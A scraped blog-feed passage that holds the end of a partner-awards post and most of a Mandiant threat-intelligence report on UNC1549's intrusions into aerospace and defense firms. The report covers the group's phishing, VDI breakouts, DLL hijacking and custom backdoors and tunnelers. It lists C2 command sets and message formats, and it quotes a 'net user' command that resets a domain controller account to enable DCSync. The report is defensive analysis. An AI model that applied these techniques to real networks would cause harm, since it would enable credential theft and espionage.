sales</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Solutions Engineering</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Delivers superior customer experiences by keeping professional skills up to date, earning at least one Google technical certification</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Embraces customer challenges head-on, taking responsibility for end-to-end solutioning</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Works with purpose, providing deliverables in a timely manner without compromising quality </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Works effectively across joint product areas, leveraging technology in innovative ways to address customer needs</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Celebrating excellence in 2025</strong></p>\n<p><span style=\"vertical-align: baseline;\">On behalf of the entire Google Cloud team, I want to extend a much-deserved congratulations to our 2025 Google Cloud Partner All-stars. Their commitment to innovation is an inspiration to us and a driving force of success to our customers.</span></p>\n<p><span style=\"vertical-align: baseline;\">Follow the celebration and engage with #PartnerAllstars on social media to learn more about these exceptional leaders.</span></p>\n<p><span style=\"vertical-align: baseline;\">Learn more about </span><a href=\"https://cloud.google.com/partners\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Partners</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-17 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense/",
        "title": "Frontline Intelligence: Analysis of UNC1549 TTPs, Custom Tools, and Malware Targeting the Aerospace and Defense Ecosystem",
        "thumbnail": null,
        "author": "Mandiant",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p>Written by: Mohamed El-Banna, Daniel Lee, Mike Stokkel, Josh Goddard</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Overview</span></h3>\n<p><span style=\"vertical-align: baseline;\">Last year, Mandiant published a </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/suspected-iranian-unc1549-targets-israel-middle-east\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog post</span></a><span style=\"vertical-align: baseline;\"> highlighting suspected Iran-nexus espionage activity targeting the aerospace, aviation, and defense industries in the Middle East. In this follow-up post, Mandiant discusses additional tactics, techniques, and procedures (TTPs) observed in incidents Mandiant has responded to.</span></p>\n<p><span style=\"vertical-align: baseline;\">Since mid-2024, Mandiant has responded to targeted campaigns by the threat group UNC1549 against the aerospace, aviation and defense industries. To gain initial access into these environments, UNC1549 employed a dual approach: deploying well-crafted phishing campaigns designed to steal credentials or deliver malware and exploiting trusted connections with third-party suppliers and partners.</span></p>\n<p><span style=\"vertical-align: baseline;\">The latter technique is particularly strategic when targeting organizations with high security maturity, such as defense contractors. While these primary targets often invest heavily in robust defenses, their third-party partners may possess less stringent security postures. This disparity provides UNC1549 a path of lesser resistance, allowing them to circumvent the primary target's main security controls by first compromising a connected entity.</span></p>\n<p><span style=\"vertical-align: baseline;\">Operating in late 2023 through 2025, UNC1549 employed sophisticated initial access vectors, including abuse of third-party relationships to gain entry (pivoting from service providers to their customers), VDI breakouts from third parties, and highly targeted, role-relevant phishing.</span></p>\n<p><span style=\"vertical-align: baseline;\">Once inside, the group leverages creative lateral movement techniques, such as stealing victim source code for spear-phishing campaigns that use lookalike domains to bypass proxies, and abusing internal service ticketing systems for credential access. They employ custom tooling, notably DCSYNCER.SLICK—a variant deployed via search order hijacking to conduct DCSync attacks.</span></p>\n<p><span style=\"vertical-align: baseline;\">UNC1549’s campaign is distinguished by its focus on anticipating investigators and ensuring long-term persistence after detection. They plant backdoors that beacon silently for months, only activating them to regain access after the victim has attempted eradication. They maintain stealth and command and control (C2) using extensive reverse SSH shells (which limit forensic evidence) and domains strategically mimicking the victim's industry.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Threat Activity</span></h3>\n<h4><span style=\"vertical-align: baseline;\">Initial Compromise</span></h4>\n<p><span style=\"vertical-align: baseline;\">A primary initial access vector employed by UNC1549 involved combining targeted social engineering with the exploitation of compromised third-party accounts. Leveraging credentials harvested from vendors, partners, or other trusted external entities, UNC1549 exploited legitimate access pathways inherent in these relationships.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Third-Party Services</span></h4>\n<p><span style=\"vertical-align: baseline;\">Notably, the group frequently abused Citrix, VMWare, and Azure Virtual Desktop and Application services provided by victim organizations to third party partners, collaborators, and contractors. Utilizing compromised third-party credentials, they authenticated to the supplier’s infrastructure, establishing an initial foothold within the network perimeter. Post-authentication, UNC1549 used techniques designed to escape the security boundaries and restrictions of the virtualized Citrix session. This breakout granted them access to the underlying host system or adjacent network segments, and enabled the initiation of lateral movement activities deeper within the target corporate network.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Spear Phishing</span></h3>\n<p><span style=\"vertical-align: baseline;\">UNC1549 utilized targeted spear-phishing emails as one of the methods to gain initial network access. These emails used lures related to job opportunities or recruitment efforts, aiming to trick recipients into downloading and running malware hidden in attachments or links. Figure 1 shows a sample phishing email sent to one of the victims.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Screenshot of a phishing email sent by UNC1549\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc1549-ttps-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Screenshot of a phishing email sent by UNC1549</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Following a successful breach, Mandiant observed UNC1549 pivoting to spear-phishing campaigns specifically targeting IT staff and administrators. The goal of this campaign was to obtain credentials with higher permissions. To make these phishing attempts more believable, the attackers often perform reconnaissance first, such as reviewing older emails in already compromised inboxes for legitimate password reset requests or identifying the company's internal password reset webpages, then crafted their malicious emails to mimic these authentic processes.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Establish Foothold</span></h3>\n<p><span style=\"vertical-align: baseline;\">To maintain persistence within compromised networks, UNC1549 deployed several custom backdoors. Beyond MINIBIKE, which Mandiant discussed in the February 2024 blog post, the group also utilizes other custom malware such as TWOSTROKE and DEEPROOT. Significantly, Mandiant's analysis revealed that while the malware used for initial targeting and compromises was not unique, every post-exploitation payload identified, regardless of family, had a unique hash. This included instances where multiple samples of the same backdoor variant were found within the same victim network. This approach highlights UNC1549's sophistication and the considerable effort invested in customizing their tools to evade detection and complicate forensic investigations.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Search Order Hijacking</span></h4>\n<p><span style=\"vertical-align: baseline;\">UNC1549 abused DLL search order hijacking to execute CRASHPAD, DCSYNCER.SLICK, GHOSTLINE, LIGHTRAIL, MINIBIKE, POLLBLEND, SIGHTGRAB, and TWOSTROKE payloads. Using the DLL search order hijacking techniques, UNC1549 achieved a persistent and stealthy way of executing their tooling.</span></p>\n<p><span style=\"vertical-align: baseline;\">Throughout the different investigations, UNC1549 demonstrated a comprehensive understanding of software dependencies by exploiting DLL search order hijacking in multiple software solutions. UNC1549 has deployed malicious binaries targeting legitimate Fortigate, VMWare, Citrix, Microsoft, and NVIDIA executables. In many cases, the threat actor installed the legitimate software after initial access in order to abuse SOH; however, in other cases, the attacker leveraged software that was already installed on victim systems and then replaced or added the malicious DLLs within the legitimate installation directory, typically with SYSTEM privileges.</span></p>\n<h4><span style=\"vertical-align: baseline;\">TWOSTROKE</span></h4>\n<p><span style=\"vertical-align: baseline;\">TWOSTROKE, a C++ backdoor, utilizes SSL-encrypted TCP/443 connections to communicate with its controllers. This malware possesses a diverse command set, allowing for system information collection, DLL loading, file manipulation, and persistence. While showing some similarities to MINIBIKE, it's considered a unique backdoor.</span></p>\n<p><span style=\"vertical-align: baseline;\">Upon execution of TWOSTROKE, it employs a specific routine to generate a unique victim identifier. TWOSTRIKE retrieves the fully qualified DNS computer name using the Windows API function </span><code style=\"vertical-align: baseline;\">GetComputerNameExW(ComputerNameDnsFullyQualified)</code><span style=\"vertical-align: baseline;\">. This retrieved name then undergoes an XOR encryption process, utilizing the static key. Following the encryption, the resulting binary data is converted into a lowercase hexadecimal string. </span></p>\n<p><span style=\"vertical-align: baseline;\">Finally, TWOSTROKE extracts the first eight characters of this hexadecimal string, reverses it, and uses it as the victim's unique bot ID for later communication with the C2 server.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Functionalities</span></h5>\n<p><span style=\"vertical-align: baseline;\">After sending the check in request to the C2 server, the TWOSTROKE C2 server returns with a hex-encoded payload that contains multiple values separated by \"</span><code style=\"vertical-align: baseline;\">@##@</code><span style=\"vertical-align: baseline;\">.\" Depending on the received command, TWOSTROKE can execute one of the following commands:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">1</code><span style=\"vertical-align: baseline;\">: Upload a file to the C2</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">2</code><span style=\"vertical-align: baseline;\">: Execute a file or a shell command</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">3</code><span style=\"vertical-align: baseline;\">: DLL execution into memory</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">4</code><span style=\"vertical-align: baseline;\">: Download file from the C2</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">5</code><span style=\"vertical-align: baseline;\">: Get the full victim user name</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">6</code><span style=\"vertical-align: baseline;\">: Get the full victim machine name</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">7</code><span style=\"vertical-align: baseline;\">: List a directory</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">8</code><span style=\"vertical-align: baseline;\">: Delete a file</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">LIGHTRAIL</span></h4>\n<p><span style=\"vertical-align: baseline;\">UNC1549 was observed downloading a ZIP file from attacker-owned infrastructure. This ZIP file contained the LIGHTRAIL tunneler as</span> <code style=\"vertical-align: baseline;\">VGAuth.dll</code><span style=\"vertical-align: baseline;\"> and was executed through search order hijacking using the </span><code style=\"vertical-align: baseline;\">VGAuthCLI.exe</code><span style=\"vertical-align: baseline;\"> executable. LIGHTRAIL is a custom tunneler, likely based on the open-source </span><code style=\"vertical-align: baseline;\">Socks4a</code><span style=\"vertical-align: baseline;\"> proxy, </span><a href=\"https://github.com/codewhitesec/Lastenzug\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Lastenzug</span></a><span style=\"vertical-align: baseline;\">, that communicates using Azure cloud infrastructure. </span></p>\n<p><span style=\"vertical-align: baseline;\">There are several distinct differences between the LIGHTRAIL sample and the </span><code style=\"vertical-align: baseline;\">LastenZug</code><span style=\"vertical-align: baseline;\"> source code. These include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Increasing the MAX_CONNECTIONS from 250 to 5000</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Static configuration inside the </span><code style=\"vertical-align: baseline;\">lastenzug</code><span style=\"vertical-align: baseline;\"> function (</span><code style=\"vertical-align: baseline;\">wPath</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">port</code><span style=\"vertical-align: baseline;\">)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">No support for using a proxy server when connecting to the WebSocket C2</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Compiler optimizations reducing the number of functions (26 to 10)</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Additionally, LastenZug is using hashing for DLLs and API function resolving. By default, the hash value is XOR’d with the value </span><code style=\"vertical-align: baseline;\">0x41507712</code>, <span style=\"vertical-align: baseline;\">while the XOR value in the observed LIGHTRAIL sample differs from the original source code - </span><code style=\"vertical-align: baseline;\">0x41424344</code> <span style=\"vertical-align: baseline;\">(</span><code style=\"vertical-align: baseline;\">‘ABCD’</code><span style=\"vertical-align: baseline;\">)</span><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">After loading the necessary API function pointers, the initialization continues by populating the server name (</span><code style=\"vertical-align: baseline;\">wServerName</code><span style=\"vertical-align: baseline;\">), the port, and URI (</span><code style=\"vertical-align: baseline;\">wPath</code><span style=\"vertical-align: baseline;\">) values. The port is hardcoded at 443 (for HTTPS) and the path is hardcoded to \"</span><code style=\"vertical-align: baseline;\">/news</code><span style=\"vertical-align: baseline;\">.\" This differs from the source code where these values are input parameters to the </span><code style=\"vertical-align: baseline;\">lastenzug </code><span style=\"vertical-align: baseline;\">function.</span></p>\n<p><span style=\"vertical-align: baseline;\">The </span><code style=\"vertical-align: baseline;\">initWS</code> <span style=\"vertical-align: baseline;\">function is responsible for establishing the WebSocket connection, which it does using the Windows WinHTTP API. The </span><code style=\"vertical-align: baseline;\">initWS</code> <span style=\"vertical-align: baseline;\">function has a hard-coded </span><span style=\"vertical-align: baseline;\">User-Agent</span><span style=\"vertical-align: baseline;\"> string which it constructs as a stack string:</span></p>\n<p><code style=\"vertical-align: baseline;\">Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136</code></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant identified another LIGHTRAIL sample uploaded to </span><a href=\"https://www.virustotal.com/gui/file/b19bdfda0cd8e50f7b5968d39aa31449a9cf9b85b8d7e00e19400cf5734f70bf/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">VirusTotal</span></a><span style=\"vertical-align: baseline;\"> from Germany. However, this sample seems to have been modified by the uploader as the C2 domain was intentionally altered.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>GET https://aaaaaaaaaaaaaaaaaa.bbbbbb.cccccccc.ddddd.com/page HTTP/1.1\nHost: aaaaaaaaaaaaaaaaaa.bbbbbb.cccccccc.ddddd.com\nConnection: Upgrade\nUpgrade: websocket\nUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136\nSec-WebSocket-Key: 9MeEoJ3sjbWAEed52LdRdg==\nSec-WebSocket-Version: 13</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 2: Modified LIGHTRAIL network communication snippet</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Most notable is that this sample is using a different URL path for its communication, but also the User-Agent in this sample is different from the one that was observed in previous LIGHTRAIL samples and the LastenZug source code.</span></p>\n<h4><span style=\"vertical-align: baseline;\">DEEPROOT</span></h4>\n<p><span style=\"vertical-align: baseline;\">DEEPROOT is a Linux backdoor written in Golang and supports the following functionalities: shell command execution, system information enumeration and file listing, delete, upload, and download. DEEPROOT was compiled to be operating on Linux systems; however, due to Golang’s architecture DEEPROOT could also be compiled for other operating systems. At the time of writing, Mandiant has not observed any DEEPROOT samples targeting Windows systems.</span></p>\n<p><span style=\"vertical-align: baseline;\">DEEPROOT was observed using multiple C2 domains hosted in Microsoft Azure. The observed DEEPROOT samples used multiple C2 servers per binary, suspected to be used for redundancy in case one C2 server has been taken down.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Functionalities</span></h5>\n<p><span style=\"vertical-align: baseline;\">After sending the check in request to the C2 server, the DEEPROOT C2 server returns with a hex-encoded payload that contains multiple values separated by ‘</span><code style=\"vertical-align: baseline;\">-===-</code><span style=\"vertical-align: baseline;\">’ </span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>&lt;sleep_timeout&gt;-===-&lt;command_id&gt;-===-&lt;command&gt;-===-&lt;argument_1&gt;-===-&lt;argument_2&gt;</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 3: Decoded POST body data structure</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">sleep_timeout</code><span style=\"vertical-align: baseline;\"> is the time in milli-seconds to wait before making the next request.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">command_id</code><span style=\"vertical-align: baseline;\"> is an identifier for the C2 command, used by the backdoor when responding to the C2 with the result.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">command</code><span style=\"vertical-align: baseline;\"> is the command number and it's one of the following:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">1</code><span style=\"vertical-align: baseline;\"> - Get directory information (directory listing), the directory path is received in </span><code style=\"vertical-align: baseline;\">argument_1</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">2</code><span style=\"vertical-align: baseline;\"> - Delete a file, the file path is received in </span><code style=\"vertical-align: baseline;\">argument_1</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">3</code><span style=\"vertical-align: baseline;\"> - Get the victim username.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">4</code><span style=\"vertical-align: baseline;\"> - Get the victim's hostname.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">5</code><span style=\"vertical-align: baseline;\"> - Execute a shell command, the shell command is received in </span><code style=\"vertical-align: baseline;\">argument_1</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">6</code><span style=\"vertical-align: baseline;\"> - Download a file from the C2, the C2 file path is received in </span><code style=\"vertical-align: baseline;\">argument_1</code><span style=\"vertical-align: baseline;\"> and the local file path is received in </span><code style=\"vertical-align: baseline;\">argument_2</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">7</code><span style=\"vertical-align: baseline;\"> - Upload a file to the C2, the local file path is received in </span><code style=\"vertical-align: baseline;\">argument_1</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">argument_1</span><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">argument_2</code><span style=\"vertical-align: baseline;\"> are the command arguments and it is optional.</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">GHOSTLINE</span></h4>\n<p><span style=\"vertical-align: baseline;\">GHOSTLINE is a Windows tunneler utility written in Golang that uses a hard-coded domain for its communication. GHOSTLINE uses the </span><a href=\"https://github.com/hashicorp/yamux\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">go-yamux</span></a><span style=\"vertical-align: baseline;\"> library for its network connection.</span></p>\n<h4><span style=\"vertical-align: baseline;\">POLLBLEND</span></h4>\n<p><span style=\"vertical-align: baseline;\">POLLBLEND is a Windows tunneler that is written in C++. Earlier iterations of POLLBLEND featured multiple hardcoded C2 servers and utilized two hardcoded URI parameters for self-registration and tunneler configuration download. For the registration of the machine, POLLBLEND would reach out to</span><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">/register/</code><span style=\"vertical-align: baseline;\"> and sent a HTTP POST request with the following JSON body.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>{\"username\": \"&lt;computer_name&gt;\"}</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 4: POLLBLEND body data</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Code Signing</span></h4>\n<p><span style=\"vertical-align: baseline;\">Throughout the tracking of UNC1549’s activity across multiple intrusions, the Iranian-backed threat group was observed signing some of their backdoor binaries with legitimate code-signing certificates—a tactic also covered by </span><a href=\"https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Check Point</span></a><span style=\"vertical-align: baseline;\">—likely to help their malware evade detection and bypass security controls like application allowlists, which are often configured to trust digitally signed code. The group employed this technique to weaponize malware samples, including variants for GHOSTLINE, POLLBLEND, and TWOSTROKE. All identified code-signing certificates have been reported to the relevant issuing Certificate Authorities for revocation.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Escalate Privileges</span></h3>\n<p><span style=\"vertical-align: baseline;\">UNC1549 has been observed using a variety of techniques and custom tools aimed at stealing credentials and gathering sensitive data post-compromise. This included a utility, tracked as DCSYNCER.SLICK, designed to mimic the DCSync Active Directory replication feature. DCSync is a legitimate function domain controllers use for replicating changes via </span><a href=\"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">RPC</span></a><span style=\"vertical-align: baseline;\">. This allowed the attackers to extract NTLM password hashes directly from the domain controllers. Another tool, dubbed CRASHPAD, focused on extracting credentials saved within web browsers. For visual data collection, they deployed SIGHTGRAB, a tool capable of taking periodic screenshots, potentially capturing sensitive information displayed on the user's screen. Additionally, UNC1549 utilized simpler methods, such as deploying TRUSTTRAP, which presented fake popup windows prompting users to enter their credentials, which were then harvested by the attackers.</span></p>\n<p><span style=\"vertical-align: baseline;\">UNC1549 frequently used DCSync attacks to obtain NTLM password hashes for domain users, which they then cracked in order to facilitate lateral movement and privilege escalation. To gain the necessary directory replication rights for DCSync, the threat actor employed several methods. They were observed unconventionally resetting passwords for domain controller computer accounts using </span><code style=\"vertical-align: baseline;\">net.exe</code><span style=\"vertical-align: baseline;\">. This action typically broke the domain controller functionality of the host and caused an outage, yet it successfully enabled them to perform the DCSync operation and extract sensitive credentials, including those for domain administrators and Azure AD Connect accounts. UNC1549 leveraged other techniques to gain domain replication rights, including creating rogue computer accounts and abusing Resource-Based Constrained Delegation (RBCD) assignments. They also performed Kerberoasting, utilizing obfuscated </span><code style=\"vertical-align: baseline;\">Invoke-Kerberoast</code><span style=\"vertical-align: baseline;\"> scripts, for credential theft.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>net user DC-01$ P@ssw0rd</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 5: Example of an UNC1549 net.exe command to reset a domain controller computer account</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In some cases, shortly after gaining a foothold on workstations, UNC1549 discovered vulnerable Active Directory Certificate Services templates. They used these to request certificates, allowing them to impersonate higher-privileged user accounts.</span></p>\n<p><span style=\"vertical-align: baseline;\">UNC1549 also frequently targeted saved credentials within web browsers, either through malicious utilities or by RDP session hijacking. In the latter, the threat actor would identify which user was logged onto a system through quser.exe or wmic.exe, and then RDP to that system with the user's account to gain access to their active and unlocked web browser sessions.</span></p>\n<h4><span style=\"vertical-align: baseline;\">DCSYNCER.SLICK</span></h4>\n<p><span style=\"vertical-align: baseline;\">DCSYNCER.SLICK is a Windows executable that is based on the Open source Project </span><a href=\"https://github.com/notsoshant/DCSyncer/tree/master\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">DCSyncer</span></a><span style=\"vertical-align: baseline;\"> and is based on Mimikatz source code. DCSYNCER.SLICK has been modified to use Dynamic API resolution and has all its printf statements removed.</span></p>\n<p><span style=\"vertical-align: baseline;\">Additionally, DCSYNCER.SLICK collects and XOR-encrypts the credentials before writing them to a hardcoded filename and path. The following hardcoded filenames and paths were observed being used by DCSYNCER.SLICK:</span></p>\n<ul>\n<li><code style=\"vertical-align: baseline;\">C:\\users\\public\\LOG.txt</code></li>\n<li><code style=\"vertical-align: baseline;\">C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\LOG.txt</code></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">To evade detection, UNC1549 executed the malware within the context of a compromised domain controller computer account. They achieved this compromise by manually resetting the account password. Instead of utilizing the standard</span><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">netdom</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">command, UNC1549 used the Windows command</span><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">net user &lt;computer_name&gt; &lt;password&gt;</code><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">Subsequently, they used these newly acquired credentials to execute the DCSYNCER.SLICK payload. This tactic would give the false impression that replication had occurred between two legitimate domain controllers.</span></p>\n<h4><span style=\"vertical-align: baseline;\">CRASHPAD</span></h4>\n<p><span style=\"vertical-align: baseline;\">CRASHPAD is a Windows executable that is written in C++ that decrypts the content of the file </span><code style=\"vertical-align: baseline;\">config.txt</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">into the file </span><code style=\"vertical-align: baseline;\">crash.log</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">by impersonating the </span><code style=\"vertical-align: baseline;\">explorer.exe</code><span style=\"vertical-align: baseline;\"> user privilege and through the </span><code style=\"vertical-align: baseline;\">CryptUnprotectData</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">API</span><span style=\"vertical-align: baseline;\">. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\crash.log</code></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\config.txt</code></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The contents of these files could not be determined because UNC1549 deleted the output after CRASHPAD was executed.</span></p>\n<p><span style=\"vertical-align: baseline;\">The CRASHPAD configuration and output file paths were hardcoded into the sample, similar to the </span><code style=\"vertical-align: baseline;\">LOG.txt</code><span style=\"vertical-align: baseline;\"> filename found in the DCSYNCER.SLICK binary.</span></p>\n<h4><span style=\"vertical-align: baseline;\">SIGHTGRAB</span></h4>\n<p><span style=\"vertical-align: baseline;\">SIGHTGRAB is a Windows executable written in C that autonomously captures screen shots at regular intervals and saves them to disk. Upon execution SIGHTGRAB loads several Windows libraries dynamically at runtime including </span><code style=\"vertical-align: baseline;\">User32.dll</code><span style=\"vertical-align: baseline;\">,</span><code style=\"vertical-align: baseline;\"> Gdi32.dll</code><span style=\"vertical-align: baseline;\">, and </span><code style=\"vertical-align: baseline;\">Ole32.dll</code><span style=\"vertical-align: baseline;\">. SIGHTGRAB implements runtime API resolution through </span><code style=\"vertical-align: baseline;\">LoadLibraryA</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">GetProcAddress</code><span style=\"vertical-align: baseline;\"> calls with encoded strings to access system functions. SIGHTGRAB uses XOR encryption with a single-byte key of </span><code style=\"vertical-align: baseline;\">0x41</code><span style=\"vertical-align: baseline;\"> to decode API function names.</span></p>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">SIGHTGRAB retrieves the current timestamp and uses string interpolation of </span><code style=\"vertical-align: baseline;\">YYYY-MM-DD-HH-MM</code><span style=\"vertical-align: baseline;\"> on the timestamp to generate the directory name. In this newly created directory, SIGHTGRAB saves all the taken screenshots incrementally.</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>C:\\Users\\Public\\Videos\\2025-3-7-10-17\\1.jpg\nC:\\Users\\Public\\Videos\\2025-3-7-10-17\\2.jpg\nC:\\Users\\Public\\Videos\\2025-3-7-10-17\\3.jpg\n\nC:\\Users\\Public\\Music\\2025-3-7-10-17\\1.jpg\nC:\\Users\\Public\\Music\\2025-3-7-10-17\\2.jpg\nC:\\Users\\Public\\Music\\2025-3-7-10-17\\3.jpg</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: 